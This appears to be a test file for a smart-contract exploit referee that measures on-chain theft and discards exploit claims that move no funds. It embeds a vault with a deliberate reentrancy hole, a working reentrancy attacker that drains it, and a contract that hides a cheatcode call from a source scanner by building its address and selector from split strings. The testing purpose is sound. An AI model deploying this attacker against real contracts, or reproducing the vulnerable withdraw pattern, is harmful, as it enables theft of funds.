import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import type { Candidate, ExploitPlan } from '@redline/shared';
import { FoundryRefereeEngine } from '../src/foundry-referee.js';
import { runCouncil } from '../src/referee.js';
import { detectFoundry } from '../src/foundry.js';
import { prepareRefereeProject, type RefereeProject } from '../src/project.js';

// The contract under review (as the GitHub App would capture it from the PR).
const VAULT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract EtherVault {
  mapping(address => uint256) public balances;
  function deposit() external payable { balances[msg.sender] += msg.value; }
  function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "no balance");
    (bool ok, ) = msg.sender.call{value: bal}("");
    require(ok, "send failed");
    balances[msg.sender] = 0; // state update AFTER the external call -> reentrant
  }
}`;

// A genuine reentrancy attacker in the deployable form the hunters now emit.
const REENTRANCY = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IVault { function deposit() external payable; function withdraw() external; }
contract ReentrancyAttacker {
  IVault public vault;
  uint256 stake;
  constructor(address v) { vault = IVault(v); }
  function attack() external payable {
    stake = msg.value;
    vault.deposit{value: msg.value}();
    vault.withdraw();
  }
  receive() external payable {
    if (address(vault).balance >= stake) { vault.withdraw(); }
  }
}`;

// The forgery the old referee fell for: an attacker that does nothing but shout a
// huge "net" through an event/log. The new referee reads nothing it prints.
const LIAR = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract LiarAttacker {
  event REDLINE_NET(uint256 net);
  constructor(address) {}
  function attack() external payable { emit REDLINE_NET(1000000 ether); }
  receive() external payable {}
}`;

// Reaches the cheatcode precompile without a literal token the scanner knows:
// the address AND the selector are assembled at runtime from split strings, so
// no `vm.`, `deal(` or precompile-address pattern appears in the source. Under
// forge test this mints 1000 ETH; as a real transaction the precompile is a
// codeless address and the call is inert.
const SNEAKY_CHEAT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract SneakyAttacker {
  constructor(address) {}
  function attack() external payable {
    address cheat = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 sel = bytes4(keccak256(abi.encodePacked("de", "al(address,uint256)")));
    (bool ok, ) = cheat.call(abi.encodeWithSelector(sel, address(this), 1000 ether));
    ok; // ignore
  }
  receive() external payable {}
}`;

const ONE_ETH = (1n * 10n ** 18n).toString();
const TEN_ETH = (10n * 10n ** 18n).toString();
const THRESH = (1n * 10n ** 15n).toString(); // 0.001 ETH

function candidate(source: string, attackerContract: string, seed = true, stake = ONE_ETH): Candidate {
  const plan: ExploitPlan = {
    attackerContract,
    targetConstructorSig: null,
    targetConstructorArgs: [],
    targetDeployValueWei: '0',
    seed: seed ? [{ sig: 'deposit()', args: [], valueWei: TEN_ETH }] : [],
    stakeWei: stake,
    targetAddress: null,
  };
  return {
    id: `c-${attackerContract}`, scanId: 's1', hunterModel: 'test', weaknessClass: 'reentrancy',
    targetContract: 'EtherVault', targetFunction: 'withdraw', summary: 'drains the vault',
    forgeTest: source, plan, steps: [], claimedValueWei: TEN_ETH, usedShortcuts: false, createdAt: '',
  };
}

const hasFoundry = (await detectFoundry()).available;
let project: RefereeProject | null = null;

beforeAll(async () => {
  if (!hasFoundry) return;
  project = await prepareRefereeProject([{ file: 'src/EtherVault.sol', source: VAULT }]);
}, 240_000);

afterAll(async () => {
  if (project) await project.cleanup();
});

describe('FoundryRefereeEngine — measures theft on chain, trusts nothing the attack says', () => {
  it.skipIf(!hasFoundry)('a genuine reentrancy reproduces: the vault lost what the attacker gained', async () => {
    const run = await new FoundryRefereeEngine().run({
      candidate: candidate(REENTRANCY, 'ReentrancyAttacker'), refereeName: 'referee-a', provider: 'room-a',
      projectDir: project!.projectDir, thresholdWei: THRESH,
    });
    expect(run.error).toBeNull();
    expect(run.outcome).toBe('moved');
    const d = run.deltas[0]!;
    expect(BigInt(d.attackerNetOfGas)).toBeGreaterThanOrEqual(BigInt(TEN_ETH) - 1n);
    expect(BigInt(d.targetBefore) - BigInt(d.targetAfter)).toBe(BigInt(TEN_ETH));
    expect(run.traceRef).toMatch(/^anvil:\/\/0x/);
  }, 240_000);

  it.skipIf(!hasFoundry)('an attacker that only CLAIMS a huge net is did-not-move (no self-report is read)', async () => {
    const run = await new FoundryRefereeEngine().run({
      candidate: candidate(LIAR, 'LiarAttacker', true, '0'), refereeName: 'referee-a', provider: 'room-a',
      projectDir: project!.projectDir, thresholdWei: THRESH,
    });
    expect(run.outcome).toBe('did-not-move');
    expect(run.deltas[0]!.attackerNetOfGas).toBe('0');
  }, 240_000);

  it.skipIf(!hasFoundry)('a cheat reached without any scanner-visible token is inert on the node', async () => {
    const run = await new FoundryRefereeEngine().run({
      candidate: candidate(SNEAKY_CHEAT, 'SneakyAttacker', true, '0'), refereeName: 'referee-a', provider: 'room-a',
      projectDir: project!.projectDir, thresholdWei: THRESH,
    });
    expect(run.outcome).toBe('did-not-move');
    expect(run.deltas[0]!.attackerNetOfGas).toBe('0');
  }, 240_000);

  it.skipIf(!hasFoundry)('with nothing in the vault, the same genuine attack moves nothing (no theft from thin air)', async () => {
    const run = await new FoundryRefereeEngine().run({
      candidate: candidate(REENTRANCY, 'ReentrancyAttacker', false), refereeName: 'referee-a', provider: 'room-a',
      projectDir: project!.projectDir, thresholdWei: THRESH,
    });
    expect(run.outcome).toBe('did-not-move');
  }, 240_000);

  it.skipIf(!hasFoundry)('a council of three real referees reproduces the genuine theft (red) and not the liar', async () => {
    const dispatch = { providers: ['room-a', 'room-b', 'room-c'], blocks: [0, 0, 0], thresholdWei: THRESH, projectDir: project!.projectDir };
    const real = await runCouncil(new FoundryRefereeEngine(), candidate(REENTRANCY, 'ReentrancyAttacker'), dispatch);
    expect(real.result.isRed).toBe(true);
    expect(real.result.consensus).toBe('reproduced');
    const liar = await runCouncil(new FoundryRefereeEngine(), candidate(LIAR, 'LiarAttacker', true, '0'), dispatch);
    expect(liar.result.isRed).toBe(false);
    expect(liar.result.consensus).toBe('not-reproduced');
  }, 480_000);

  it.skipIf(!hasFoundry)('an attacker that does not compile is build-failed, never moved', async () => {
    const run = await new FoundryRefereeEngine().run({
      candidate: candidate('contract Broken { this is not solidity }', 'Broken'), refereeName: 'referee-a', provider: 'room-a',
      projectDir: project!.projectDir, thresholdWei: THRESH,
    });
    expect(run.outcome).toBe('build-failed');
  }, 240_000);
});
